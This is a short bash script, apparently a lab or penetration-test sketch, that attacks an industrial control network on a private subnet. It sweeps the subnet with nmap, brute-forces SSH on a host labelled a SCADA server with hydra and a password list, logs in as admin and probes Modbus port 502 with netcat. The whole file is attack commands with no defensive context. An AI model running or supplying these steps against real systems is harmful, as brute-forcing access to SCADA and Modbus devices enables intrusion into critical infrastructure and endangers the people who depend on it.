#!/bin/bash

# Scan the network
nmap -sP 192.168.1.0/24

# Brute-force SSH on SCADA Server
hydra -l admin -P passwords.txt ssh://192.168.1.10

# Connect to SCADA Server
ssh admin@192.168.1.10

# Test Modbus connectivity
nc -zv 192.168.1.30 502